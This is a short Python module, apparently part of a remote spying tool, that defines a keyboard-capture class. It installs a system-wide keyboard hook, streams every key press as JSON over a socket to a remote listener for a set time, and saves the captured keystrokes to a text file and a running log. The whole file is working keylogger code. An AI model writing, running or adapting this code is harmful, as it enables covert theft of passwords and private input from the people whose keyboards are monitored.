import pygame, sys, os
import pygame.camera
import time, random
import base64, json
from pyxhook import HookManager 

SAVEDIR = os.path.dirname(os.path.abspath(__file__)) + "/temp"

pygame.init()

class Keyboard(object):
	__hook = None
	def __init__(self):
		pass
	
	def getKeys(self):
		pass
	
	def getKeysData(self,socketClient, size):
		self.captureKeys(socketClient, size)	
	
	def captureKeys(self,socketClient, size):
		def sendKey(event):
			data = json.dumps({'type': 6, 'code': 1 ,'status' : 'OK', 'keyboard': str(event)})
			socketClient.sendall(data)
		
		self.__hook = HookManager()
		self.__hook.HookKeyboard()
		self.__hook.KeyDown = sendKey
		self.__hook.start()
		time.sleep(size)
		self.__hook.cancel()
		filename = "%s/%s.txt" % (SAVEDIR, 'keys')
		f = open(filename, "w")
		try:
			ftemp = open(filename + ".log", "r")
		except:
			ftemp = open(filename + ".log", "w")
		
		keys = "".join(self.__hook.getListKeys())
		f.write(keys)
		f.close()
		lines = "".join(ftemp.readlines())
		ftemp.close()
		ftemp = open(filename + ".log", "w")
		ftemp.write(lines + keys)
		ftemp.close()
		
